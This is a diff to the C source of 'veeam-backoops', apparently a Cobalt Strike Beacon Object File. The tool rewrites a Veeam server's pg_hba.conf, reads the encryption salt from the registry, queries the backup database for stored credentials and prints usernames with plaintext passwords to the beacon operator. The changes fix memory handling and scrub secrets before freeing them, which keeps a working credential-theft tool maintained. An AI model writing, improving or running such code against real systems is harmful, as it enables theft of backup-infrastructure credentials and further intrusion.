@@ -302,7 +302,7 @@ static DWORD vb_data_pg_hba_overwrite(vb_data_t *vb_data) {
     return ERROR_BAD_LENGTH;
   }
 
-  vb_data->pg_hba_orig = ALLOC(vb_data->pg_hba_len);
+  vb_data->pg_hba_orig = ALLOC(vb_data->pg_hba_len + 1);
   if (!vb_data->pg_hba_orig) {
     DWORD ret = KERNEL32$GetLastError();
     KERNEL32$CloseHandle(h_conf);
@@ -318,13 +318,6 @@ static DWORD vb_data_pg_hba_overwrite(vb_data_t *vb_data) {
 
   SIZE_T new_conf_len = 128 + (bof_strlen(PG_DATABASE) * 2) + \
                               (bof_strlen(PG_USERNAME) * 2);
-
-  vb_data->pg_hba_config = ALLOC(new_conf_len);
-  if (!vb_data->pg_hba_config) {
-    DWORD ret = KERNEL32$GetLastError();
-    KERNEL32$CloseHandle(h_conf);
-    return ret;
-  }
 
   formatp fmt_new_conf, fmt_path_copy;
   BeaconFormatAlloc(&fmt_new_conf, new_conf_len);
@@ -410,9 +403,13 @@ static LSTATUS vb_get_encryption_salt(unsigned char **md, DWORD *olen,
   DWORD t = 0, s = 0;
   if ((r = KERNEL32$RegQueryValueExA(h_key, key,
                                      NULL, &t, NULL, &s)) != ERROR_SUCCESS) {
+    KERNEL32$RegCloseKey(h_key);
     *olen = 0;
     return r;
   }
+
+  if (t != REG_SZ && t != REG_EXPAND_SZ)
+    return ERROR_INVALID_DATA;
 
   *md = (unsigned char*)ALLOC(s + 1);
   if (!(*md)) {
@@ -427,9 +424,8 @@ static LSTATUS vb_get_encryption_salt(unsigned char **md, DWORD *olen,
                                      NULL, NULL, (LPBYTE)*md, &s)) != ERROR_SUCCESS) {
     r = KERNEL32$GetLastError();
     *olen = 0;
-  } else {
+  } else
     *olen = s;
-  }
 
   KERNEL32$RegCloseKey(h_key);
 
@@ -568,7 +564,7 @@ static int vb_get_credentials(libpq_t *pq, struct vb_credential **vbc) {
          *description = pq->PQgetvalue(pq->res, r, 2); 
     
     /* Only care about the credential sets that contain a password */
-    if (strlen(password) > 0) {
+    if (bof_strlen(password) > 0) {
       /* If we don't have a head for a linked list of struct vb_credential* yet, make one */
       if (!ret) *vbc = vb_credential_add(NULL, username, password, description); 
       else vb_credential_add(*vbc, username, password, description);
@@ -587,20 +583,38 @@ void vb_data_free(vb_data_t *vb_data) {
   /* Yes check for these individually as KERNEL32$GlobalFree won't ignore
    * NULLs mateyboi */
 
-  if (vb_data->pg_hba_config)   FREE(vb_data->pg_hba_config);
-  if (vb_data->pg_hba_orig)     FREE(vb_data->pg_hba_orig);
-  if (vb_data->encryption_salt) FREE(vb_data->encryption_salt);
+  if (vb_data->pg_hba_config)    FREE(vb_data->pg_hba_config);
+  if (vb_data->pg_hba_orig)      FREE(vb_data->pg_hba_orig);
+  if (vb_data->encryption_salt)  FREE(vb_data->encryption_salt);
+  if (vb_data->pg_hba_path)      FREE(vb_data->pg_hba_path);
+  if (vb_data->pg_hba_path_copy) FREE(vb_data->pg_hba_path_copy);
 
   if (vb_data->vbc) {
     struct vb_credential *cur = vb_data->vbc, *tmp;
     while (cur) {
       tmp = cur;
       cur = cur->next;
-      if (tmp->username)    FREE(tmp->username);
-      if (tmp->password)    FREE(tmp->password);
-      if (tmp->description) FREE(tmp->description);
-      if (tmp->plaintext)   FREE(tmp->plaintext);
-      if (tmp)              FREE(tmp);
+      if (tmp->username) {
+        bof_memset(tmp->username, 0, bof_strlen(tmp->username));
+        FREE(tmp->username);
+      }
+
+      if (tmp->password) {
+        bof_memset(tmp->password, 0, bof_strlen(tmp->password));
+        FREE(tmp->password);
+      }
+
+      if (tmp->description) {
+        bof_memset(tmp->description, 0, bof_strlen(tmp->description));
+        FREE(tmp->description);
+      }
+
+      if (tmp->plaintext) {
+        bof_memset(tmp->plaintext, 0, bof_strlen(tmp->plaintext));
+        FREE(tmp->plaintext);
+      }
+
+      if (tmp) FREE(tmp);
     }
   }
 }
@@ -622,7 +636,7 @@ void go(char *args, int a_len) {
   DWORD status;
 
   /* Banner */
-  BeaconPrintf(CALLBACK_OUTPUT, "                     --+== veeam-backoops by ripmeep ==+--\n");
+  BeaconPrintf(CALLBACK_OUTPUT, _V"--+== veeam-backoops by ripmeep ==+--\n");
 
   /* Map libpq.dll functions to our struct */
   if ((status = vb_libpq_map(&pq, &libpq_path)) != ERROR_SUCCESS) {
@@ -711,8 +725,7 @@ void go(char *args, int a_len) {
       continue;
     BeaconPrintf(CALLBACK_OUTPUT, _V"%-48s | %-32s | %s\n", cred->description ? cred->description : "", cred->username, cred->plaintext);
   }
-  BeaconPrintf(CALLBACK_OUTPUT, _V);
-
+  
 cleanup:
   vb_libpq_free(&pq);
   vb_data_free(&vb_data);
